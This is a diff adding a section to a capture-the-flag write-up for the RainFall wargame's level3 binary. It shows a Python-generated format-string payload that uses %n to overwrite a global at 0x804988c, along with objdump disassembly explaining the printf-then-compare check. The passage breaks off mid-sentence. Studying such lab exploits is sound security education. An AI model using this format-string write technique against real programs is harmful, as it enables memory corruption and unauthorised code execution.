@@ -106,3 +106,34 @@ level3@RainFall:~$ ./level3
 200 b7fd1ac0 b7ff37d0 25207825 78252078
 ```
 after `200`, it shows esp status before printf function excution.
+
+The payload will be like this
+```bash
+level3@RainFall:~$ python -c 'print"\x8c\x98\x04\x08%08x%08x%044x%n"' | ./level3
+�00000200b7fd1ac0000000000000000000000000000000000000b7ff37d0
+Wait what?!
+
+```
+First of all, let's figure out why the memory have to place in front of the strings.
+
+```bash
+level3@RainFall:~$ objdump -d ./level3 | less
+ 80484be:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
+ 80484c4:       89 04 24                mov    %eax,(%esp)
+ 80484c7:       e8 d4 fe ff ff          call   80483a0 <fgets@plt>
+ 80484cc:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
+ 80484d2:       89 04 24                mov    %eax,(%esp)
+ 80484d5:       e8 b6 fe ff ff          call   8048390 <printf@plt>
+ 80484da:       a1 8c 98 04 08          mov    0x804988c,%eax
+ 80484df:       83 f8 40                cmp    $0x40,%eax
+ 80484e2:       75 34                   jne    8048518 <v+0x74>
+ 80484e4:       a1 80 98 04 08          mov    0x8049880,%eax
+ 80484e9:       89 c2                   mov    %eax,%edx
+ 80484eb:       b8 00 86 04 08          mov    $0x8048600,%eax
+ 80484f0:       89 54 24 0c             mov    %edx,0xc(%esp)
+ 80484f4:       c7 44 24 08 0c 00 00    movl   $0xc,0x8(%esp)
+
+```
+
+We have to focus on mov and compare after `printf` function.
+So we going to put `0x804988c` memory in little median 
